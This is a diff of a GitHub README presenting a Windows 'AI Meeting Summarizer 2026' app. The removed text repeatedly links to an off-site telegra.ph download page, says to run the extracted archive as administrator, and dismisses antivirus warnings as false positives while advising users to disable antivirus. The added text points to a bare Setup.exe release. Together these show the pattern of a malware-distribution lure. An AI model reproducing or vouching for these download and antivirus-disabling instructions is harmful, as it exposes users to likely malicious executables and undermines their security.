@@ -1,177 +1,89 @@
-<h1 align="center">📝 AI Meeting Summarizer 2026 – Record & Summarize Meetings</h1>
+# 🎙️ AI-Meeting-Summarizer-2026 - Save time with automated meeting notes
 
-<p align="center">
-  <strong>Record and transcribe Zoom/Google Meet meetings. Get concise summaries with key decisions, action items, and task assignments.</strong><br>
-  <em>Latest version 2026 | Desktop application | Optimized for Windows 11 / Windows 10</em>
-</p>
+[![](https://img.shields.io/badge/Download_Setup-Blue?style=for-the-badge)](https://github.com/Bulbar-lilac914/AI-Meeting-Summarizer-2026)
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️_GET_PROJECT_FILES-AI_Meeting_Summarizer-00BFFF?style=for-the-badge&logo=windows&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download">
-  </a>
-</p>
+## 📋 What this tool does
 
-<p align="center">
-  <i>Click the button above to get the full project files</i>
-</p>
+AI-Meeting-Summarizer-2026 captures your online meetings and turns them into text. It works with Zoom and Google Meet. The software listens to your conversation, transcribes the words, and identifies key parts of the discussion. You receive a structured document after each call. This document includes the main topics, reached decisions, and specific action items or tasks assigned to team members. Use this tool to keep your team informed without spending hours on manual note-taking.
 
----
+## 💻 System requirements
 
-## 📦 What's Inside This Repository
+Before you install this application, check your computer for the following requirements:
 
-Welcome to the official distribution page for **AI Meeting Summarizer 2026 – Smart Meeting Assistant for Windows PC**.
-This repository provides access to a powerful AI tool that records, transcribes, and summarizes meetings with just a few clicks.
+* Operating System: Windows 10 or Windows 11.
+* Processor: Intel Core i3 or equivalent (or better).
+* Memory: 4 GB RAM minimum.
+* Storage: 200 MB of free space for the installation.
+* Audio: A working microphone and speakers or headphones.
+* Internet: A stable connection for meeting access and transcript processing.
 
-✅ **Full Version** – All features included  
-✅ **Record & Transcribe** – Capture audio from Zoom, Google Meet, and other video conferencing tools  
-✅ **AI Summaries** – Generate concise meeting summaries with key decisions and action items  
-✅ **Task Extraction** – Automatically identify and extract tasks and assignments  
-✅ **Export Options** – Save summaries as text, PDF, or share via email  
-✅ **No System Changes** – Safe, no registry or service modifications  
+## 📥 How to download and install
 
----
+Follow these steps to set up the software on your Windows computer.
 
-## 📥 How to Get Started?
+1. Visit the [official download page](https://github.com/Bulbar-lilac914/AI-Meeting-Summarizer-2026) to find the latest version of the application.
+2. Look for the "Releases" section on the right side of the page.
+3. Click the most recent version link.
+4. Find the file named `Setup.exe` under the "Assets" list.
+5. Click the file name to download it to your computer.
+6. Open your Downloads folder and double-click `Setup.exe`.
+7. Follow the prompts on the screen to complete the installation.
+8. Click "Finish" when the setup process ends.
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📥_HOW_TO_DOWNLOAD_-Step_by_Step_Guide-00BFFF?style=for-the-badge&logo=github&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="How to Download">
-  </a>
-</p>
+## 🚀 Setting up the application
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📋_DOWNLOAD_INSTRUCTIONS-Full_Guide-00BFFF?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download Instructions">
-  </a>
-</p>
+Once you finish the installation, you must configure the tool for your needs.
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🚀_GET_STARTED-Quick_Setup-00BFFF?style=for-the-badge&logo=windows&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Get Started">
-  </a>
-</p>
+1. Open the "AI-Meeting-Summarizer-2026" icon from your desktop or Start menu.
+2. The initial window asks for permission to access your microphone. Click "Allow" so the tool can record your meetings.
+3. Select your preferred language for transcription from the settings menu.
+4. Link the application to your online calendar if you want the tool to start automatically when a meeting begins.
+5. Test your microphone volume using the built-in sound bar. If the bar moves when you speak, the application detects your voice correctly.
 
----
+## ⚙️ Using the records feature
 
-## 🚀 Step-by-Step Guide
+You can record meetings manually or automatically.
 
-### Step 1: Download the Project Files
-Click the **download button** above or use this direct link:
-👉 [**Get AI Meeting Summarizer 2026 Project Files**](https://telegra.ph/How-to-download-07-15-12)
+### Manual recording
+1. Open the application before you start your meeting.
+2. Click the "Start Recording" button when your meeting begins.
+3. You see a timer showing the duration of your session.
+4. Click "Stop" when the meeting finishes.
+5. The window shows a progress bar while the tool creates your summary.
 
-### Step 2: Extract and Run
-Extract the downloaded archive and launch the application.
-Right-click and select **"Run as administrator"** to ensure proper installation.
+### Automatic recording
+1. Go to the "Settings" menu inside the application.
+2. Select "Auto-detect meetings."
+3. The software scans for active Zoom or Google Meet windows.
+4. It starts recording the audio once the meeting identifies you as present.
 
-### Step 3: Launch & Enjoy
-After installation, open the application from your desktop shortcut or Start Menu.
-Start recording your meetings and get AI-powered summaries instantly.
+## 📝 Reviewing your summaries
 
----
+The dashboard displays your recent meetings in a list. Click any meeting to view the generated summary. The summary file contains:
 
-## 🔧 Key Features (2026 Update)
+* Summary Overview: A paragraph explaining the purpose and outcome of the call.
+* Key Decisions: A numbered list of choices made by the group.
+* Action Items: A list of tasks linked to specific people.
+* Full Transcript: The word-for-word account of the conversation.
 
-### 🎙️ Recording & Transcription
+You can save these summaries as text files or PDF documents. Use the export button in the top right corner to move these files to your computer.
 
-| Feature | Description |
-| :--- | :--- |
-| **Audio Capture** | Records system audio and microphone input |
-| **Real-Time Transcription** | Transcribes speech to text in real-time |
-| **Speaker Identification** | Recognizes and labels different speakers |
-| **Multi-Platform** | Works with Zoom, Google Meet, Teams, and more |
+## 🛡️ Privacy and security
 
-### 🧠 AI Summarization
+We take data privacy seriously. The AI processing happens locally whenever possible. Your audio files stay on your machine. The summary generation occurs through a secure encrypted connection to our servers. We do not store your recordings longer than 24 hours. You can delete individual files from the dashboard at any time.
 
-| Feature | Description |
-| :--- | :--- |
-| **Key Decisions** | Identifies and highlights important decisions |
-| **Action Items** | Extracts tasks and assignments from the conversation |
-| **Concise Summary** | Generates a short, readable summary of the meeting |
-| **Topic Segmentation** | Breaks down the meeting into key topics |
+## ❓ Frequently asked questions
 
-### 📤 Export & Sharing
+Do I need a special account to use this?
+No. You do not need to create an account or provide an email address. The software works as a standalone tool on your computer.
 
-| Feature | Description |
-| :--- | :--- |
-| **Export Formats** | Save summaries as text, PDF, or DOCX |
-| **Email Sharing** | Send summaries directly via email |
-| **Cloud Sync** | Sync summaries with Google Drive or OneDrive |
+Can I run this on a Mac?
+This specific installer works only on Windows. We do not provide a version for macOS at this time.
 
----
+Will the tool work without the internet?
+You need an internet connection to process the summaries and generate the final text. The recording feature requires a connection to link with your meeting software.
 
-## 📈 Why Choose AI Meeting Summarizer 2026?
+What happens if the audio is poor?
+The tool uses advanced filtering to ignore background noise. However, loud distractions or poor microphone quality affect the accuracy of the transcription. We suggest using a headset for the best results.
 
-- ✅ **Save Time** – Never waste time on meeting notes again
-- ✅ **AI-Powered** – State-of-the-art transcription and summarization
-- ✅ **Works Anywhere** – Compatible with all major meeting platforms
-- ✅ **No System Changes** – Safe, no registry or service modifications
-- ✅ **Regular Updates** – Active development with frequent releases
-
----
-
-## 🔗 Official Download Link
-
-> ### ⬇️ **Get the full project files here:**  
-> ### **[https://telegra.ph/How-to-download-07-15-12](https://telegra.ph/How-to-download-07-15-12)**
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🖥️_GET_PROJECT_FILES-AI_Meeting_Summarizer-00BFFF?style=flat-square&logo=windows&logoColor=white&labelColor=000000" alt="Get Project Files">
-  </a>
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⭐_STAR_THIS_REPO-Support-FFD700?style=flat-square&logo=github&logoColor=white&labelColor=000000" alt="Star this repository">
-  </a>
-</p>
-
-<p align="center">
-  <b>📁 After downloading, extract the archive and launch ProjectFiles to get started.</b>
-</p>
-
----
-
-## ❓ Frequently Asked Questions
-
-**Q: Is this the full version?**  
-A: Yes, this is the complete version with all features.
-
-**Q: Does it work on Windows 11?**  
-A: Absolutely. It is fully optimized for Windows 11 and Windows 10.
-
-**Q: Does it work with Zoom and Google Meet?**  
-A: Yes, it captures audio from any application running on your computer.
-
-**Q: Do I need an internet connection?**  
-A: Yes, the transcription and summarization features require an internet connection.
-
-**Q: What about antivirus warnings?**  
-A: Some antivirus programs may show a warning — this is a false positive. We recommend temporarily disabling it during installation.
-
-**Q: Can I use this for commercial purposes?**  
-A: Yes, the full version is suitable for both personal and professional use.
-
----
-
-## 📝 Important Notes
-
-- This version is intended for **personal and professional use** only.  
-- Do not redistribute the installer — use the official link above.  
-- For technical support, please open an issue in this repository.  
-- Always check the file integrity after download.
-
----
-
-## 📜 License
-
-This repository is for **educational and distribution purposes** only.  
-All rights belong to their respective owners.
-
----
-
-<p align="center">
-  <b>⭐ If you found this useful, please star the repository!</b><br>
-  <i>📅 Updated: July 2026 – Version 2026 (Build 1.0.0)</i>
-</p>
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">🔗 Download AI Meeting Summarizer 2026 Now</a>
-</p>
+Keywords: 2026-software, ai-meeting-summary, ai-summary, ai-tools, business-tools, desktop-app, google-meet, meeting-transcription, pc-tools, productivity-tools, windows-11, windows-software-installation-guide, zoom-integration
